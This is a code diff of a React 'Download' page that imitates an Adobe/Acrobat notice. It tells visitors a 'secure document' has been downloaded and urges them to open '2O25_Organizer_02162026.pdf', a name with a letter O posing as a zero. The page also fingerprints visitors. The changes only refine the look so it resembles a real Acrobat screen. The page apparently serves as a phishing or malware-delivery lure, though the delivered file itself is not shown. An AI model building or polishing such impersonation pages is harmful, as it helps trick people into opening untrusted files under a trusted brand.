@@ -1,7 +1,7 @@
 import { useEffect, useMemo } from "react";
 import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
 import adbLogo from "@/assets/adb-logo.png";
-import adobeBg from "@/assets/adobe-bg.png";
+import acrobatBg from "@/assets/adobe-acrobat-bg.png";
 
 const randomDigits = (len = 8) =>
   Array.from(crypto.getRandomValues(new Uint8Array(len)))
@@ -45,32 +45,32 @@ const Download = () => {
 
   return (
     <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden">
-      {/* Background - edge to edge */}
-      <img src={adobeBg} alt="" className="absolute inset-0 w-full h-full object-fill" />
+      {/* Screenshot as background - edge to edge */}
+      <img src={acrobatBg} alt="" className="absolute inset-0 w-full h-full object-fill" />
 
-      {/* Modal card */}
-      <div className="relative z-10 bg-white rounded-lg shadow-2xl max-w-lg w-full mx-4 py-10 px-10 flex flex-col items-center text-center">
+      {/* Modal card overlaid on top */}
+      <div className="relative z-10 bg-white rounded-lg shadow-2xl max-w-[420px] w-full mx-4 py-10 px-10 flex flex-col items-center text-center">
         {/* Adobe PDF Logo */}
         <div className="mb-6">
-          <img src={adbLogo} alt="Adobe PDF" className="w-28 h-32 object-contain" />
+          <img src={adbLogo} alt="Adobe PDF" className="w-24 h-28 object-contain" />
         </div>
 
-        <h1 className="text-2xl font-bold text-[#1a1a1a] mb-3">Download Complete</h1>
+        <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-2">Download Complete</h1>
 
-        <p className="text-sm text-[#999] mb-5">You've received a secure document:</p>
+        <p className="text-sm text-[#999] italic mb-5">You've received a secure document:</p>
 
-        <p className="text-base text-[#444] mb-1">
+        <p className="text-[15px] text-[#444] mb-0.5 leading-relaxed">
           Your Document has been downloaded to your device.
         </p>
-        <p className="text-base text-[#444] mb-1">
+        <p className="text-[15px] text-[#444] mb-0.5 leading-relaxed">
           Please check your <strong>Downloads</strong> folder
         </p>
-        <p className="text-base text-[#444] mb-6">
+        <p className="text-[15px] text-[#444] mb-6 leading-relaxed">
           and open <strong>2O25_Organizer_02162026.pdf</strong> To view your
           document.
         </p>
 
-        <p className="text-base text-[#444] mb-6">
+        <p className="text-[15px] text-[#444] mb-6 leading-relaxed">
           If your Download did not start automatically, you can<br />
           download the document again
         </p>
@@ -78,7 +78,7 @@ const Download = () => {
         <a
           href={downloadFile.href}
           download={downloadFile.name}
-          className="inline-block bg-[#0078d4] hover:bg-[#106ebe] text-white font-semibold px-10 py-3 rounded text-sm transition-colors"
+          className="inline-block bg-[#0078d4] hover:bg-[#106ebe] text-white font-semibold px-8 py-3 rounded text-sm transition-colors"
         >
           Download Document
         </a>
